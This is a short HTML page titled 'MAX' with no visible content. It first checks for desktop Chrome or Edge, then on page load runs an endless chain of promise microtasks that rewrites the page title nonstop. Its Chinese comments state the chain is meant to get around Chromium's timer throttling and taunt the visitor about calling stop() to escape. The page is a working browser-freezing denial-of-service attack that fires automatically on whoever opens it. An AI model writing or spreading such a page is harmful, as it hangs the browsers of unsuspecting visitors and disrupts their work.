<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>MAX</title>
<style>
body {
  background:#000;
  color:rgb(255, 255, 255);
  font-family: monospace;
  text-align:center;
  padding-top:50px;
}
</style>
</head>
<body>
  <script>
(function() {
    const ua = navigator.userAgent.toLowerCase();
    const isEdge = ua.indexOf('edg/') > -1;
    const isChrome = ua.indexOf('chrome') > -1 && ua.indexOf('chromium') === -1 && !isEdge;
    const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
    if (!((isChrome || isEdge) && !isMobile)) {
        document.body.innerHTML = `
            <div style="text-align:center; margin-top:100px; font-family: sans-serif;">
                <p>请使用 <strong>PC 版本的 Edge 或 Chrome</strong> 浏览器打开此页面。</p>
            </div>
        `;
        window.stop(); 
    }
})();
</script>
<script>
let running = true;
let i = 0;
function flood() {
  if (!running) return;
  document.title = "X" + (i++) + Math.random().toString(36);
  // microtask 连锁，绕过 Chromium 的 interval 节流
  Promise.resolve().then(flood);
}
window.addEventListener("load", () => {
  flood();
});

// 你可以在控制台执行 stop() 来救自己（如果还能点得到）
function stop() {
  running = false;
}
</script>
  
</body>
</html>
